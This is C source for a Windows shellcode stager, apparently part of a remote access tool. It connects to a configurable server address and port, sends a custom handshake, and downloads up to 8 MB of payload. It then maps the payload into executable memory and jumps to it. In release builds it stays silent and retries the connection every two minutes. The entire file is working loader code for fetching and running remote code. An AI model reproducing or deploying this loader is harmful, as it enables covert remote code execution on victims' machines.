#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>

#ifdef _DEBUG
#include <stdio.h>
#define Mprintf printf
#define IsRelease 0
#else
#define Mprintf(format, ...) 
#define IsRelease 1
#endif

#pragma comment(lib, "ws2_32.lib")

#pragma pack(push, 1)
typedef struct PkgHeader {
	char flag[8];
	int totalLen;
	int originLen;
} PkgHeader;
#pragma pack(pop)

PkgHeader MakePkgHeader(int originLen) {
	PkgHeader header = { 0 };
	memcpy(header.flag, "Hello?", 6);
	header.originLen = originLen;
	header.totalLen = sizeof(PkgHeader) + originLen;
	return header;
}

int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
{
	struct sockaddr_in sa = {0};
	if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
		strncpy(outIpBuffer, hostName, bufferSize - 1);
		outIpBuffer[bufferSize - 1] = '\0';
		return 0;
	}

	struct addrinfo hints = {0};
	struct addrinfo* res = NULL;
	hints.ai_family = AF_INET;  // IPv4 only
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(hostName, NULL, &hints, &res) != 0 || res == NULL) {
		return -1;
	}

	struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
	if (inet_ntop(AF_INET, &(ipv4->sin_addr), outIpBuffer, bufferSize) == NULL) {
		freeaddrinfo(res);
		return -2;
	}

	freeaddrinfo(res);
	return 0;
}

const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
	if (!sIP || !sizeOut) return NULL;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return NULL;

	char serverIP[INET_ADDRSTRLEN] = { 0 };
	if (GetIPAddress(sIP, serverIP, sizeof(serverIP)) == 0) {
		Mprintf("Resolved IP: %s\n", serverIP);
	} else {
		Mprintf("Failed to resolve '%s'.\n", sIP);
		WSACleanup();
		return NULL;
	}

	const int bufSize = (8 * 1024 * 1024);
	char* buffer = (char*)malloc(bufSize);
	if (!buffer) {
		WSACleanup();
		return NULL;
	}

	BOOL isFirstConnect = TRUE;
	int attemptCount = 0, requestCount = 0;
	do {
		if (!isFirstConnect)
			Sleep(IsRelease ? 120 * 1000 : 5000);
		isFirstConnect = FALSE;
		Mprintf("Connecting attempt #%d -> %s:%d \n", ++attemptCount, serverIP, serverPort);

		SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (clientSocket == INVALID_SOCKET)
			continue;

		DWORD timeout = 30000;
		setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

		struct sockaddr_in serverAddr = { 0 };
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(serverPort);
		serverAddr.sin_addr.s_addr = inet_addr(serverIP);
		if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
			closesocket(clientSocket);
			continue;
		}

		char command[4] = { 210, sizeof(void*) == 8, 0, IsRelease };
		char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
		PkgHeader h = MakePkgHeader(sizeof(command));
		memcpy(req, &h, sizeof(PkgHeader));
		memcpy(req + sizeof(PkgHeader), command, sizeof(command));
		int bytesSent = send(clientSocket, req, sizeof(req), 0);
		if (bytesSent != sizeof(req)) {
			closesocket(clientSocket);
			continue;
		}

		int totalReceived = 0;
		if (requestCount < 3) {
			requestCount++;
			const int bufferSize = 16 * 1024;
			time_t tm = time(NULL);
			while (totalReceived < bufSize) {
				int bytesToReceive = (bufferSize < bufSize - totalReceived) ? bufferSize : (bufSize - totalReceived);
				int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
				if (bytesReceived <= 0) {
					Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
					break;
				}
				totalReceived += bytesReceived;
				if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
					Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
					break;
				}
			}
		} else {
			closesocket(clientSocket);
			break;
		}

		PkgHeader* header = (PkgHeader*)buffer;
		if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
			Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
			closesocket(clientSocket);
			continue;
		}
		unsigned char* ptr = buffer + sizeof(PkgHeader);
		int size = 0;
		BYTE cmd = ptr[0], type = ptr[1];
		memcpy(&size, ptr + 2, sizeof(int));
		*sizeOut = size;
		if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
			closesocket(clientSocket);
			break;
		}
		closesocket(clientSocket);
		WSACleanup();
		return buffer;
	} while (1);

	free(buffer);
	WSACleanup();
	return NULL;
}

struct CONNECT_ADDRESS
{
	char	        szFlag[32];
	char			szServerIP[100];
	char			szPort[8];
	char			szReserved[160];
}g_Server = { "Hello, World!", "127.0.0.1", "6543" };

int main() {
	int size = 0;
	const char* dllData = ReceiveShellcode(g_Server.szServerIP, atoi(g_Server.szPort), &size);
	if (dllData == NULL) return -1;
	void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == execMem) return -2;
	memcpy(execMem, dllData + 22, size);
	free((void*)dllData);
	DWORD oldProtect = 0;
	if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;

	((void(*)())execMem)();
	Sleep(INFINITE);
	return 0;
}
